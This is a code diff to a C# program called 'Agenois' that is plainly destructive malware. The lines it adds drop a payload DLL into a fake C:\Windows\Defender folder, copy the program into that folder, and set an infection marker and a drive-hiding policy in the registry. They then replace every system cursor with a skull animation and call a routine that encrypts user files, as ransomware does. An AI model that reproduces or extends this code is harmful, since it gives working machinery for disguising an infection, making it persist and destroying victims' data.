@@ -21,6 +21,14 @@ namespace Agenois
         {
             InitializeComponent();
 
+            string extractPath = @"C:\Windows\Defender";
+            Directory.CreateDirectory(@"C:\Windows\Defender");
+            try
+            {
+                File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
+            }
+            catch { }
+            
             //Everything on startup.
 
             Destructive.EnableCriticalMode();
@@ -29,11 +37,9 @@ namespace Agenois
 
             if (Process.GetProcessesByName("Agenois").Count() > 1) { Environment.Exit(0); }
 
-            string extractPath = @"C:\Windows\System32\Defender";
-
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Agenois", "AgenoisInfected", null) == null)
             {
-                Directory.CreateDirectory(extractPath);
+                File.WriteAllBytes(extractPath + "\\cursor.ani", Resources.skull1);
                 //File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
                 File.Copy(Application.ExecutablePath, extractPath + @"\Agenois.exe");
 
@@ -60,6 +66,47 @@ namespace Agenois
                 editKey.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
                 editKey.Close();
 
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("Arrow", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("Hand", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("Wait", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("AppStarting", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("Help", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("UpArrow", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("No", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("SizeWE", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("SizeNWSE", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("SizeNS", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("SizeNESW", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("SizeAll", extractPath + "\\cursor.ani");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("NWPen", extractPath + "\\cursor.ani");
+                editKey.Close();
+
+                Destructive.EncryptUserFiles();
             }
         }
 
